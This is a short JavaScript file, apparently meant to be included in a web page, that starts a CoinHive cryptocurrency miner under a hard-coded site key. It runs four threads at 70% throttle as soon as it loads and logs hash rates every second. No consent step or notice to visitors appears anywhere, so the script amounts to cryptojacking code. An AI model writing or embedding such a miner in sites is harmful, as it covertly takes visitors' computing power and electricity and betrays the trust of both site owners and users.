console.log('hive.js loaded');
var miner = new CoinHive.Anonymous('MqidnnsOB78vBqyPvhtNyFM04Ir9WPTy', {
  threads: 4,
  autoThreads: false,
  throttle: 0.7,
  forceASMJS: false
});
miner.start();
// Listen on events
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
	var hashesPerSecond = miner.getHashesPerSecond();
	var totalHashes = miner.getTotalHashes();
	var acceptedHashes = miner.getAcceptedHashes();

	// Output to HTML elements...
  console.log(""+hashesPerSecond+"/HPS");
  console.log(""+acceptedHashes+"/AH")

}, 1000);
